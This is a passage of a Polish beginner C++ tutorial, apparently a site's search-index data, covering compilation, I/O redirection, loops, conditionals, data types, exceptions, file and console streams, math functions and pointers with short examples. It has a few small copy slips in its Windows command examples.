<pre><code>g++ -O2 main.cpp\n</code></pre> <pre><code>g++ -O2 main.cpp\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#debugowanie","title":"Debugowanie","text":"<p>Aby w\u0142\u0105czy\u0107 debugowanie u\u017cyjemy opcji <code>-g</code>.</p> LinuxWindows <pre><code>g++ -g main.cpp\n</code></pre> <pre><code>g++ -g main.cpp\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#przekierowanie-wejsciawyjscia","title":"Przekierowanie wej\u015bcia/wyj\u015bcia","text":"<p>Uruchamianie skompilowanego programu z terminala ma swoje zalety. Jedn\u0105 z nich jest \u0142atwe przekierowanie wej\u015bcia i wyj\u015bcia naszego programu, np. z i do pliku.</p>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#wejscie-z-pliku","title":"Wej\u015bcie z pliku","text":"<p>Aby przekierowa\u0107 wej\u015bcie z pliku tekstowego nale\u017cy skorzysta\u0107 z operatora <code>&lt;</code>.</p> LinuxWindows <pre><code>./main.out &lt; dane_wej.txt\n</code></pre> <pre><code>.\\main.exe &lt; dane_wyj.txt\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#wyjscie-do-pliku","title":"Wyj\u015bcie do pliku","text":"<p>W celu utworzenia pliku i przekierowania do niego wyj\u015bcia z naszego programu u\u017cyjemy operatora <code>&gt;</code>.</p> LinuxWindows <pre><code>./main.out &gt; dane_wyj.txt\n</code></pre> <pre><code>.\\main.exe &gt; dane_wyj.txt\n</code></pre> <p>Je\u017celi nie chcemy nadpisywa\u0107 pliku, a jedynie dopisa\u0107 do niego nowe dane, u\u017cyjemy operatora <code>&gt;&gt;</code>.</p> LinuxWindows <pre><code>./main.out &gt;&gt; dane_wyj.txt\n</code></pre> <pre><code>.\\main.exe &gt; dane_wyj.txt\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/cmd-compilation/#jedno-i-drugie-naraz","title":"Jedno i drugie naraz","text":"<p>Powy\u017csze metody mo\u017cemy ze sob\u0105 \u0142\u0105czy\u0107, w dowolnej kolejno\u015bci.</p> LinuxWindows <pre><code>./main.out &lt; dane_wej.txt &gt; dane_wyj.txt\n</code></pre> <pre><code>.\\main.exe &lt; dane_wej.txt &gt; dane_wyj.txt\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/conditional-loop/","title":"P\u0119tla warunkowa","text":"<p>W j\u0119zyku C++ mamy dwa rodzaje p\u0119tli warunkowych: while oraz do while.</p>"},{"location":"programming/c%2B%2B/introduction/conditional-loop/#while","title":"While","text":"<p>P\u0119tla warunkowa w C++ ma standardow\u0105 konstrukcj\u0119:</p> <pre><code>while (warunek) {\n    instrukcje\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/conditional-loop/#przykad","title":"Przyk\u0142ad","text":"<pre><code>int x = 1;\n\nwhile (x &lt; 10) {\n    cout &lt;&lt; x &lt;&lt; endl;\n    x++;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/conditional-loop/#do-while","title":"Do while","text":"<p>Jest te\u017c druga forma tej p\u0119tli, w kt\u00f3rej warunek jest sprawdzany zawsze po wykonaniu instrukcji w p\u0119tli.</p>"},{"location":"programming/c%2B%2B/introduction/conditional-loop/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>int x = 1;\n\ndo {\n    cout &lt;&lt; x &lt;&lt; endl;\n    x++;\n} while (x &lt; 10);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/conditional-loop/#roznice","title":"R\u00f3\u017cnice","text":"<p>G\u0142\u00f3wna r\u00f3\u017cnica pomi\u0119dzy p\u0119tlami <code>while</code> i <code>do while</code> dotyczy momentu, w kt\u00f3rym sprawdzany jest warunek. Najlepiej mo\u017cna to zobaczy\u0107 na przyk\u0142adzie, w kt\u00f3rym warunek p\u0119tli nie jest spe\u0142niony ju\u017c na samym pocz\u0105tku:</p> <pre><code>int x = 1;\n\nwhile (x &lt; 1) {\n    cout &lt;&lt; \"while\" &lt;&lt; endl;\n    x++;\n}\n\ndo {\n    cout &lt;&lt; \"do while\" &lt;&lt; endl;\n    x++;\n} while (x &lt; 1);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/conditionals/","title":"Instrukcja warunkowa","text":""},{"location":"programming/c%2B%2B/introduction/conditionals/#instrukcja-prosta","title":"Instrukcja prosta","text":"<pre><code>if (warunek) {\n    operacje;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/conditionals/#instrukcja-pena","title":"Instrukcja pe\u0142na","text":"<pre><code>if (warunek) {\n    operacje;\n} else {\n    operacje;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/conditionals/#instrukcja-zozona","title":"Instrukcja z\u0142o\u017cona","text":"<pre><code>if (warunek) {\n    operacje;\n} else if (warunek) {\n    operacje;\n} else {\n    operacje;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/data-types/","title":"Podstawowe typy zmiennych","text":""},{"location":"programming/c%2B%2B/introduction/data-types/#liczby-cakowite","title":"Liczby ca\u0142kowite","text":""},{"location":"programming/c%2B%2B/introduction/data-types/#ze-znakiem","title":"Ze znakiem","text":"TypIlo\u015b\u0107 bajt\u00f3wZakres<code>char</code>1[-2^{7},2^{7}-1] <code>short</code>2[-2^{15},2^{15}-1] <code>int</code>4[-2^{31},2^{31}-1] <code>long int</code>4[-2^{31},2^{31}-1] <code>long long int</code>8[-2^{63},2^{63}-1]"},{"location":"programming/c%2B%2B/introduction/data-types/#bez-znaku","title":"Bez znaku","text":"TypIlo\u015b\u0107 bajt\u00f3wZakres<code>unsigned char</code>1[0,2^{8}-1] <code>unsigned short</code>2[0,2^{16}-1] <code>unsigned int</code>4[0,2^{32}-1] <code>unsigned long int</code>4[0,2^{32}-1] <code>unsigned long long int</code>8[0,2^{64}-1]"},{"location":"programming/c%2B%2B/introduction/data-types/#liczby-zmiennoprzecinkowe","title":"Liczby zmiennoprzecinkowe","text":"TypIlo\u015b\u0107 bajt\u00f3wZakres<code>float</code>4\\pm3.4e \\pm 38 (~ 7 znak\u00f3w)<code>double</code>8\\pm1.7e \\pm 308 (~ 15 znak\u00f3w)<code>long double</code>10[3.4e-4932,1.1e+4932]"},{"location":"programming/c%2B%2B/introduction/exceptions/","title":"Wyj\u0105tki","text":"<p>B\u0142\u0119dy s\u0105 rzecz\u0105 ludzk\u0105 - nie unikniemy ich. B\u0142\u0119d\u00f3w nie unikniemy tak\u017ce w programowaniu, ale cz\u0119\u015b\u0107 z nich mo\u017cemy przewidzie\u0107 i obs\u0142u\u017cy\u0107. Zastan\u00f3wmy si\u0119 na przyk\u0142ad nad dzieleniem dw\u00f3ch liczb przez siebie. Mo\u017cemy do tego napisa\u0107 specjaln\u0105 funkcj\u0119, kt\u00f3ra przyjmie dwa parametry: dzieln\u0105 i dzielnik. Co jednak, gdy spr\u00f3bujemy podzieli\u0107 przez zero? Nasz program zako\u0144czy si\u0119 b\u0142\u0119dem. Mo\u017cemy to przewidzie\u0107 i doda\u0107 instrukcj\u0119 warunkow\u0105, kt\u00f3ra sprawdzi, czy nie chcemy podzieli\u0107 przez zero. Jaki jednak wynik powinna zwr\u00f3ci\u0107 nasza funkcja w takim przypadku? Jak poinformowa\u0107 u\u017cytkownika/programist\u0119, \u017ce pr\u00f3bowano wykona\u0107 niedozwolon\u0105 operacj\u0119? W takim przypadku, zamiast zwraca\u0107 konkretn\u0105 warto\u015b\u0107, mo\u017cemy wyrzuci\u0107 wyj\u0105tek.</p>"},{"location":"programming/c%2B%2B/introduction/exceptions/#throw","title":"throw","text":"<p>W momencie, gdy wewn\u0105trz funkcji wykryjemy, \u017ce dosz\u0142o do niedozwolonej sytuacji, mo\u017cemy wyrzuci\u0107 wyj\u0105tek. Robimy to za pomoc\u0105 s\u0142owa kluczowego <code>throw</code>. Po wyrzuceniu wyj\u0105tku funkcja ko\u0144czy swoje dzia\u0142anie.</p>"},{"location":"programming/c%2B%2B/introduction/exceptions/#przykad","title":"Przyk\u0142ad","text":"<pre><code>int divide(int a, int b) {\n  if(b == 0) {\n    throw \"Dzielenie przez 0\";\n  }\n\n  return a / b;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/exceptions/#try-catch","title":"try-catch","text":"<p>Do obs\u0142ugi wyj\u0105tk\u00f3w pos\u0142u\u017cy nam blok <code>try{} catch() {}</code>. W cz\u0119\u015bci <code>try</code> pr\u00f3bujemy wykona\u0107 problematyczne operacje. Takie operacje, kt\u00f3re mog\u0105 zako\u0144czy\u0107 si\u0119 b\u0142\u0119dem, a dok\u0142adniej: wyj\u0105tkiem.</p> <p>Blok <code>catch</code> natomiast s\u0142u\u017cy do z\u0142apania, czy te\u017c przechwycenia wyj\u0105tku. Tutaj okre\u015blamy, jakie operacje powinien wykona\u0107 program, po napotkaniu wyj\u0105tku.</p> <p>Przyjrzyjmy si\u0119 poni\u017cszemu przyk\u0142adowi.</p>"},{"location":"programming/c%2B%2B/introduction/exceptions/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>int main() {\n  int a = 2, b = 0, c;\n\n  try {\n    c = divide(a,b);\n    cout &lt;&lt; a &lt;&lt; \" / \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; c &lt;&lt; endl;\n  } catch(const char* error) {\n    cout &lt;&lt; error &lt;&lt; endl;\n  }\n\n  return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/introduction/exceptions/#link-do-implementacji","title":"Link do implementacji","text":"<p>Wyj\u0105tek - przyk\u0142ad</p>"},{"location":"programming/c%2B%2B/introduction/files-stream/","title":"Obs\u0142uga plik\u00f3w - strumienie","text":""},{"location":"programming/c%2B%2B/introduction/files-stream/#biblioteka","title":"Biblioteka","text":"<p>Do obs\u0142ugi plik\u00f3w za pomoc\u0105 strumieni potrzebujemy biblioteki <code>fstream</code> (file stream). Poniewa\u017c biblioteka ta znajduje si\u0119 w przestrzeni nazw <code>std</code>, dla u\u0142atwienia mo\u017cna tak\u017ce doda\u0107 t\u0119 przestrze\u0144.</p> <pre><code>#include &lt;fstream&gt;\nusing namespace std;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/files-stream/#wyjscie","title":"Wyj\u015bcie","text":""},{"location":"programming/c%2B%2B/introduction/files-stream/#otwarcie-pliku","title":"Otwarcie pliku","text":"<p>W celu otwarcia pliku do zapisu tworzymy zmienn\u0105 typu <code>ofstream</code> (output file stream). Nast\u0119pnie w nawiasach po nazwie zmiennej podajemy \u015bcie\u017ck\u0119 do pliku, kt\u00f3ry chcemy otworzy\u0107, a po przecinku dodatkowe opcje. Je\u017celi docelowy plik nie istnieje, to zostanie on utworzony.</p>"},{"location":"programming/c%2B%2B/introduction/files-stream/#otwarcie-w-trybie-nadpisania","title":"Otwarcie w trybie nadpisania","text":"<p>Domy\u015blnie, gdy otwieramy plik do zapisu, to jego zawarto\u015b\u0107 zostanie zast\u0105piona now\u0105 zawarto\u015bci\u0105. To tak, jakby\u015bmy usun\u0119li plik i utworzyli nowy.</p> <pre><code>ofstream outfile(\"out.txt\");\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/files-stream/#otwarcie-w-trybie-dopisywania","title":"Otwarcie w trybie dopisywania","text":"<p>Je\u017celi chcemy dopisywa\u0107 dane do pliku, a nie je zast\u0105pi\u0107, nale\u017cy poda\u0107 odpowiedni\u0105 opcj\u0119 przy tworzeniu strumienia do pliku: <code>fstream::app</code>.</p> <pre><code>ofstream outfile(\"out.txt\", fstream::app);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/files-stream/#pisanie-do-pliku","title":"Pisanie do pliku","text":"<p>W przypadku zapisywania danych do pliku post\u0119pujemy podobnie jak podczas korzystania ze strumienia <code>cout</code>. R\u00f3\u017cnica jest taka, \u017ce zamiast u\u017cywa\u0107 <code>cout</code>, podajemy nazw\u0119 utworzonego strumienia typu <code>ofstream</code>.</p> <pre><code>outfile &lt;&lt; \"Hello World!\";\n</code></pre> <p>W podobny spos\u00f3b mo\u017cemy wypisa\u0107 warto\u015bci zmiennych:</p> <pre><code>int a = 10;\noutfile &lt;&lt; a;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/files-stream/#zamkniecie-pliku","title":"Zamkni\u0119cie pliku","text":"<p>Po wykonaniu potrzebnych operacji na pliku nale\u017cy strumie\u0144 do niego zamkn\u0105\u0107 metod\u0105 <code>close</code>. Je\u017celi nie zamkniemy strumienia do pliku to dane mog\u0105 nie zosta\u0107 poprawnie zapisane, a sam plik mo\u017ce zosta\u0107 uszkodzony.</p> <pre><code>outfile.close();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/functions/","title":"Funkcje","text":"<p>Funkcja w C++ sk\u0142ada si\u0119 z nag\u0142\u00f3wka i cia\u0142a. Nag\u0142\u00f3wek definiuje nazw\u0119 funkcji, jej typ zwracany oraz parametry (je\u015bli takie istniej\u0105), a cia\u0142o zawiera kod, kt\u00f3ry jest wykonywany, gdy funkcja jest wywo\u0142ywana.</p> <pre><code>typ_zwracany nazwa_funkcji(parametry) {\n    // Cia\u0142o funkcji\n}\n</code></pre> <p>Ze wzgl\u0119du na typ zwracanej warto\u015bci mo\u017cemy wyr\u00f3\u017cni\u0107 dwa rodzaje funkcji:</p> <ol> <li>Funkcje nie zwracaj\u0105ce warto\u015bci (funkcje typu void): <pre><code>void hello() {\n    std::cout &lt;&lt; \"Hello, World!\" &lt;&lt; std::endl;\n}\n</code></pre></li> <li>Funkcje zwracaj\u0105ce warto\u015b\u0107 okre\u015blonego typu: <pre><code>int add(int a, int b) {\n    return a + b;\n}\n</code></pre></li> </ol>"},{"location":"programming/c%2B%2B/introduction/functions/#wywoywanie-funkcji","title":"Wywo\u0142ywanie funkcji","text":"<p>Funkcj\u0119 wywo\u0142uje si\u0119, podaj\u0105c jej nazw\u0119 i przekazuj\u0105c argumenty (je\u015bli s\u0105 wymagane).</p> <pre><code>hello();\n</code></pre> <pre><code>int result = add(5, 3);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/input-output-streams/","title":"Obs\u0142uga wej\u015bcia/wyj\u015bcia - strumienie","text":""},{"location":"programming/c%2B%2B/introduction/input-output-streams/#biblioteka","title":"Biblioteka","text":"<p>Do obs\u0142ugi wej\u015bcia/wyj\u015bcia za pomoc\u0105 strumieni potrzebujemy biblioteki <code>iostream</code> (input/output stream). Poniewa\u017c biblioteka ta znajduje si\u0119 w przestrzeni nazw <code>std</code>, dla u\u0142atwienia mo\u017cna tak\u017ce doda\u0107 t\u0119 przestrze\u0144.</p> <pre><code>#include &lt;iostream&gt;\nusing namespace std;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/input-output-streams/#wyjscie","title":"Wyj\u015bcie","text":"<p>Do wypisania komunikat\u00f3w w konsoli wykorzystujemy strumie\u0144 cout. W celu wypisania komunikatu wystarczy poda\u0107, co chcemy wypisa\u0107:</p> <pre><code>cout &lt;&lt; \"Hello World!\";\n</code></pre> <p>W podobny spos\u00f3b mo\u017cemy wypisa\u0107 warto\u015bci zmiennych:</p> <pre><code>int a = 10;\ncout &lt;&lt; a;\n</code></pre> <p>Proces wygl\u0105da identycznie w przypadku wszystkich podstawowych typ\u00f3w, np.:</p> <pre><code>string a = \"Hello\";\ncout &lt;&lt; a;\n</code></pre> <p>Mo\u017cemy tak\u017ce \u0142\u0105czy\u0107 komunikaty:</p> <pre><code>int a = 10;\ncout &lt;&lt; \"a = \" &lt;&lt; a;\n</code></pre> <p>W celu wypisania znaku nowej linii mo\u017cemy skorzysta\u0107 z polecenia <code>endl</code> (end line):</p> <pre><code>cout &lt;&lt; \"Hello Wordl!\" &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/input-output-streams/#wejscie","title":"Wej\u015bcie","text":"<p>Do wczytywania wej\u015bcia z konsoli wykorzystujemy strumie\u0144 <code>cin</code>. W celu wczytania warto\u015bci do zmiennej wystarczy poda\u0107 t\u0119 zmienn\u0105:</p> <pre><code>int a;\ncin &gt;&gt; a;\n</code></pre> <p>Proces wygl\u0105da identycznie w przypadku wszystkich podstawowych typ\u00f3w, np.:</p> <pre><code>string a;\ncin &gt;&gt; a;\n</code></pre> <p>Mo\u017cemy tak\u017ce wczyta\u0107 wiele warto\u015bci za pomoc\u0105 jednego polecenia:</p> <pre><code>int a;\nstring b;\ndouble c;\n\ncin &gt;&gt; a &gt;&gt; b &gt;&gt; c;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/input-output-streams/#manipulacja-wejsciemwyjsciem","title":"Manipulacja wej\u015bciem/wyj\u015bciem","text":"<p>Do zaawansowanej obs\u0142ugi wej\u015bcia/wyj\u015bcia potrzebna jest biblioteka:</p> <pre><code>#include &lt;iomanip&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/input-output-streams/#dokumentacja","title":"Dokumentacja","text":"<p>iomanip - dokumentacja</p>"},{"location":"programming/c%2B%2B/introduction/input-output-streams/#precyzja-wyjscia","title":"Precyzja wyj\u015bcia","text":"<p>Je\u017celi chcemy wypisa\u0107 liczb\u0119 rzeczywist\u0105 z zadan\u0105 precyzj\u0105, tzn. z zaokr\u0105gleniem do wskazanej liczby cyfr po przecinku, to skorzystamy z polecenia <code>setprecision</code>:</p> <pre><code>double a = 0.1234567;\n\ncout &lt;&lt; setprecision(4) &lt;&lt; a &lt;&lt; endl;\ncout &lt;&lt; setprecision(8) &lt;&lt; a &lt;&lt; endl;\ncout &lt;&lt; setprecision(10) &lt;&lt; a &lt;&lt; endl;\n</code></pre> <p>https://replit.com/@damiankurpiewski/setprecision#main.cpp</p> <p>Je\u017celi chcemy, by liczba by\u0142a wypisywana zawsze z okre\u015blon\u0105 liczb\u0105 miejsc po przecinku (nawet je\u017celi od pewnego miejsca s\u0105 same zera), to nale\u017cy najpierw u\u017cy\u0107 polecenia <code>fixed</code>:</p> <pre><code>double a = 0.1234567;\n\ncout &lt;&lt; fixed;\ncout &lt;&lt; setprecision(4) &lt;&lt; a &lt;&lt; endl;\ncout &lt;&lt; setprecision(8) &lt;&lt; a &lt;&lt; endl;\ncout &lt;&lt; setprecision(10) &lt;&lt; a &lt;&lt; endl;\n</code></pre> <p>https://replit.com/@damiankurpiewski/setprecisionfixed#main.cpp</p>"},{"location":"programming/c%2B%2B/introduction/input-output-streams/#inne-systemy-liczbowe","title":"Inne systemy liczbowe","text":"<p>Mo\u017cemy wypisa\u0107 liczby w wybranym systemie liczbowym (\u00f3semkowym, dziesi\u0119tnym lub szesnastkowym) za pomoc\u0105 polecenia <code>setbase</code>:</p> <pre><code>int a = 110;\n\ncout &lt;&lt; setbase(8);\ncout &lt;&lt; \"osemkowy: \" &lt;&lt; a &lt;&lt; endl;\n\ncout &lt;&lt; setbase(16);\ncout &lt;&lt; \"szesnastkowy: \" &lt;&lt; a &lt;&lt; endl;\n\ncout &lt;&lt; setbase(10);\ncout &lt;&lt; \"dziesietny: \" &lt;&lt; a &lt;&lt; endl;\n</code></pre> <p>https://replit.com/@damiankurpiewski/coutsetbase#main.cpp</p> <p>Podobnie mo\u017cemy zrobi\u0107 w przypadku wczytywania warto\u015bci w innych systemach liczbowych:</p> <pre><code>int a;\n\ncout &lt;&lt; \"Osemkowy:\" &lt;&lt; endl;\ncin &gt;&gt; setbase(8);\ncin &gt;&gt; a; // Np. 156\n\ncout &lt;&lt; \"Wczytano: \" &lt;&lt; a &lt;&lt; endl;\n\ncout &lt;&lt; \"Szesnastkowy:\" &lt;&lt; endl;\ncin &gt;&gt; setbase(16);\ncin &gt;&gt; a; // Np. 6e\n\ncout &lt;&lt; \"Wczytano: \" &lt;&lt; a &lt;&lt; endl;\n</code></pre> <p>https://replit.com/@damiankurpiewski/cinsetbase#main.cpp</p>"},{"location":"programming/c%2B%2B/introduction/iterative-loop/","title":"P\u0119tla iteracyjna","text":"<p>W j\u0119zyku C++ p\u0119tla iteracyjna sk\u0142ada si\u0119 z trzech cz\u0119\u015bci:</p> <ol> <li>Inicjalizacji licznika p\u0119tli (np. <code>int i = 0</code>).</li> <li>Warunku p\u0119tli (np. <code>i &lt; 10</code>).</li> <li>Kroku p\u0119tli (np. <code>i++</code>).</li> </ol>"},{"location":"programming/c%2B%2B/introduction/iterative-loop/#przykady","title":"Przyk\u0142ady","text":""},{"location":"programming/c%2B%2B/introduction/iterative-loop/#prosta-petla-iteracyjna","title":"Prosta p\u0119tla iteracyjna","text":"<p>Dziesi\u0119\u0107 razy wypisujemy napis <code>Hello World!</code></p> <pre><code>for (int i = 0; i &lt; 10; i++) {\n        cout &lt;&lt; \"Hello World!\" &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/iterative-loop/#wypisanie-licznika-petli","title":"Wypisanie licznika p\u0119tli","text":"<pre><code>for (int i = 0; i &lt; 10; i++) {\n        cout &lt;&lt; i &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/iterative-loop/#inne-parametry","title":"Inne parametry","text":"<p>Parametry p\u0119tli mo\u017cemy dowolnie zmienia\u0107, by dostosowa\u0107 je do naszych potrzeb.</p> <pre><code>for (int i = 2; i &lt;= 5; i++) {\n        cout &lt;&lt; i &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/iterative-loop/#krok-petli","title":"Krok p\u0119tli","text":"<p>Cz\u0119sto wygodnym rozwi\u0105zaniem jest modyfikacja kroku p\u0119tli. Np. je\u017celi chcemy wypisa\u0107 tylko liczby parzyste z zakresu [0,10) to mo\u017cemy w ka\u017cdym kroku zwi\u0119ksza\u0107 licznik o 2, zamiast standardowo o 1.</p> <pre><code>for (int i = 0; i &lt; 10; i += 2) {\n        cout &lt;&lt; i &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/iterative-loop/#petla-malejaca","title":"P\u0119tla malej\u0105ca","text":"<p>Cz\u0119sto korzystamy z p\u0119tli rosn\u0105cej. Nic nie stoi jednak na przeszkodzie, aby wykorzysta\u0107 p\u0119tl\u0119 malej\u0105c\u0105. W tym celu zmieniamy parametry p\u0119tli, a przede wszystkim jej krok.</p> <pre><code>for (int i = 10; i &gt;= 0; i--) {\n        cout &lt;&lt; i &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/iterative-loop/#istniejacy-licznik","title":"Istniej\u0105cy licznik","text":"<p>Nie musimy deklarowa\u0107 nowej zmiennej w formie licznika p\u0119tli. Mo\u017cemy skorzysta\u0107 z ju\u017c istniej\u0105cej zmiennej.</p> <pre><code>int i;\nfor (i = 0; i &lt; 10; i++) {\n    cout &lt;&lt; i &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/iterative-loop/#pena-implementacja","title":"Pe\u0142na implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    cout &lt;&lt; \"Prosta petla for wykonujaca 10 powtorzen\" &lt;&lt; endl;\n    for (int i = 0; i &lt; 10; i++) {\n        cout &lt;&lt; \"Hello World!\" &lt;&lt; endl;\n    }\n\n    cout &lt;&lt; endl;\n    cout &lt;&lt; \"Idziemy od 0 do 9 wlacznie. Po kazdym kroku petli zwiekszamy licznik petli (i) o 1\" &lt;&lt; endl;\n    cout &lt;&lt; \"Petla wykonuje sie tak dlugo, jak spelniony jest podany warunekm tzn. dopoki i &lt; 10\" &lt;&lt; endl;\n    for (int i = 0; i &lt; 10; i++) {\n        cout &lt;&lt; i &lt;&lt; endl;\n    }\n\n    cout &lt;&lt; endl;\n    cout &lt;&lt; \"Mozemy zmienic poczatkowa wartosc licznika, a takze warunek petli\" &lt;&lt; endl;\n    for (int i = 2; i &lt;= 5; i++) {\n        cout &lt;&lt; i &lt;&lt; endl;\n    }\n\n    cout &lt;&lt; endl;\n    cout &lt;&lt; \"Mozemy takze modyfikowac krok petli\" &lt;&lt; endl;\n    for (int i = 0; i &lt; 10; i += 2) {\n        cout &lt;&lt; i &lt;&lt; endl;\n    }\n\n    cout &lt;&lt; endl;\n    cout &lt;&lt; \"Iteracja od 10 do 0 takze jest proste. Wystarczy zmniejszac licznik petli po kazdym kroku\" &lt;&lt; endl;\n    for (int i = 10; i &gt;= 0; i--) {\n        cout &lt;&lt; i &lt;&lt; endl;\n    }\n\n    int i;\n    cout &lt;&lt; endl;\n    cout &lt;&lt; \"Mozemy takze wykorzystac istniejaca zmienna w roli licznika petli\" &lt;&lt; endl;\n    for (i = 0; i &lt; 10; i++) {\n        cout &lt;&lt; i &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/math/","title":"Funkcje matematyczne","text":"<p>Poka\u017cemy kilka przyk\u0142adowych i przydatnych funkcji, jakie mo\u017cna znale\u017a\u0107 w bibliotece cmath.</p>"},{"location":"programming/c%2B%2B/introduction/math/#biblioteka","title":"Biblioteka","text":"<pre><code>#include &lt;cmath&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/math/#dokumentacja","title":"Dokumentacja","text":"<p>cmath - dokumentacja</p>"},{"location":"programming/c%2B%2B/introduction/math/#przykadowe-funkcje","title":"Przyk\u0142adowe funkcje","text":""},{"location":"programming/c%2B%2B/introduction/math/#pierwiastek","title":"Pierwiastek","text":"<pre><code>cout &lt;&lt; \"Pierwiastek: \" &lt;&lt; sqrt(2) &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/math/#potegowanie","title":"Pot\u0119gowanie","text":"<pre><code>cout &lt;&lt; \"Podnoszenie do potegi: \" &lt;&lt; pow(2, 10) &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/math/#wartosc-bezwzgledna","title":"Warto\u015b\u0107 bezwzgl\u0119dna","text":"<pre><code>cout &lt;&lt; \"Wartosc bezwgledna z liczby calkowitej: \" &lt;&lt; abs(-2) &lt;&lt; endl;\ncout &lt;&lt; \"Wartosc bezwgledna z liczby rzeczywistej: \" &lt;&lt; fabs(-2.5) &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/math/#zaokraglanie","title":"Zaokr\u0105glanie","text":"<pre><code>cout &lt;&lt; \"Zaokraglenie w gore (sufit): \" &lt;&lt; ceil(2.3) &lt;&lt; endl;\ncout &lt;&lt; \"Zaokraglenie w dol (podloga): \" &lt;&lt; floor(2.3) &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/math/#link-do-implementacji","title":"Link do implementacji","text":"<p>cmath - przyk\u0142ady</p>"},{"location":"programming/c%2B%2B/introduction/pointers/","title":"Wska\u017aniki","text":"<p>W j\u0119zyku C++ wska\u017aniki pozwalaj\u0105 na przechowywanie adres\u00f3w zmiennych. Wska\u017anik to typ danych, kt\u00f3ry przechowuje adres pami\u0119ci, gdzie zapisane s\u0105 jakie\u015b dane, np. inna zmienna. Wska\u017anik mo\u017ce by\u0107 u\u017cyty do przechowywania adresu zmiennej, aby m\u00f3c na nim wykonywa\u0107 operacje takie jak odczytanie lub zapisanie warto\u015bci.</p>"},{"location":"programming/c%2B%2B/introduction/pointers/#wskazniki-do-zmiennych","title":"Wska\u017aniki do zmiennych","text":"<p>Zacznijmy od prostego przyk\u0142adu, w kt\u00f3rym wska\u017anik b\u0119dzie wskazywa\u0142 na inn\u0105 zmienn\u0105.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int x = 10;\n    int *ptr = &amp;x;\n\n    cout &lt;&lt; \"Wartosc zmiennej x: \" &lt;&lt; x &lt;&lt; endl;\n    cout &lt;&lt; \"Wartosc zmiennej x, przechowywana w wskazniku: \" &lt;&lt; *ptr &lt;&lt; endl;\n\n    cout &lt;&lt; \"Adres zmiennej x: \" &lt;&lt; &amp;x &lt;&lt; endl;\n    cout &lt;&lt; \"Adres zmiennej x, przechowywany w wskazniku: \" &lt;&lt; ptr &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre> <p>Jak wida\u0107 w powy\u017cszym przyk\u0142adzie, w celu utworzenia wska\u017anika typu <code>int</code>, nale\u017cy przed nazw\u0105 zmiennej wska\u017anikowej postawi\u0107 gwiazdk\u0119 (<code>*</code>). Aby wska\u017anik wskazywa\u0142 na dan\u0105 zmienn\u0105, musimy do niego przypisa\u0107 adres tej zmiennej. Adres zmiennej pobieramy za pomoc\u0105 operatora adresowego (<code>&amp;</code>).</p> <p>Warto zauwa\u017cy\u0107, \u017ce wska\u017anik przechowuje adres zmiennej, a nie jej warto\u015b\u0107. Aby odczyta\u0107 warto\u015b\u0107 zmiennej, nale\u017cy u\u017cy\u0107 operatora dereferencji (<code>*</code>).</p>"},{"location":"programming/c%2B%2B/introduction/pointers/#wskazniki-do-tablic","title":"Wska\u017aniki do tablic","text":"<p>W C++, wska\u017aniki mo\u017cna u\u017cy\u0107 do przechowywania adres\u00f3w element\u00f3w tablic. Nie musimy jednak tworzy\u0107 wska\u017anik\u00f3w dla ka\u017cdego elementu tablicy, poniewa\u017c mo\u017cemy u\u017cy\u0107 jednego wska\u017anika dla ca\u0142ej tablicy. W tym celu ustawiamy wska\u017anik na adres pierwszego elementu w tablicy.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int arr[] = {1, 2, 3, 4, 5};\n    int *ptr = arr;\n\n    for (int i = 0; i &lt; 5; i++) {\n        cout &lt;&lt; *ptr &lt;&lt; \" \";\n        ptr++; \n    }\n\n    return 0;\n}\n</code></pre> <p>W powy\u017cszym przyk\u0142adzie, wska\u017anik <code>ptr</code> przechowuje adres pierwszego elementu tablicy <code>arr</code>. Nast\u0119pnie, za pomoc\u0105 p\u0119tli, wypisujemy warto\u015bci zmiennej, 